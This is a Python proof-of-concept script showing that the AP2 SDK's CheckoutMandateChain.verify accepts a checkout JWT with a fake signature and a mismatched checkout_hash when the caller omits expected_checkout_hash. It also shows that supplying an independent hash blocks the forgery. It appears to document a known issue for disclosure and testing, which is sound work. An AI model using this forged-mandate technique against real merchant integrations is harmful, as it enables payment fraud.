"""checkout_jwt signature and hash binding are left to the integrator.

The spec requires the merchant to check that the Checkout JWT's hash matches the
checkout_hash claim. CheckoutMandateChain.verify only performs that check when
the caller passes expected_checkout_hash, and the SDK never verifies the
merchant signature on checkout_jwt. The reference merchant calls verify without
that argument, so a forged-signature, wrong-hash checkout passes.

Not a new vulnerability: see issue #331.

Ref: https://github.com/google-agentic-commerce/AP2/issues/331
"""

from ap2.sdk.checkout_mandate_chain import CheckoutMandateChain
from ap2.sdk.generated.checkout_mandate import CheckoutMandate
from ap2.sdk.generated.open_checkout_mandate import OpenCheckoutMandate
from ap2.sdk.generated.types.merchant import Merchant
from ap2.tests.conftest import make_checkout_jwt, make_cnf, make_line_item
from cryptography.hazmat.primitives.asymmetric import ec


def main() -> None:
    cnf = make_cnf(ec.generate_private_key(ec.SECP256R1()).public_key())

    # make_checkout_jwt sets the signature to the literal "sig": it is never verified.
    checkout_jwt = make_checkout_jwt(
        merchant=Merchant(id="evil-merchant", name="EvilStore"),
        line_items=[make_line_item(sku="x", title="item", quantity=1, unit_price=1)],
    )
    chain = CheckoutMandateChain.parse([
        OpenCheckoutMandate(constraints=[], cnf=cnf),
        CheckoutMandate(checkout_jwt=checkout_jwt, checkout_hash="not-verified"),
    ])

    without_hash = chain.verify(checkout_jwt=chain.closed_mandate.checkout_jwt)
    print(f"{'BLOCKED' if without_hash else 'ALLOWED':8} reference call (no expected_checkout_hash)")

    with_hash = chain.verify(
        checkout_jwt=chain.closed_mandate.checkout_jwt,
        expected_checkout_hash="independently-computed-hash",
    )
    print(f"{'BLOCKED' if with_hash else 'ALLOWED':8} integrator passes an independent hash")
    for v in with_hash:
        print(f"         {v}")

    assert not without_hash, "without the hash argument the binding is not checked"
    assert with_hash, "an independent hash catches the mismatch"


if __name__ == "__main__":
    main()
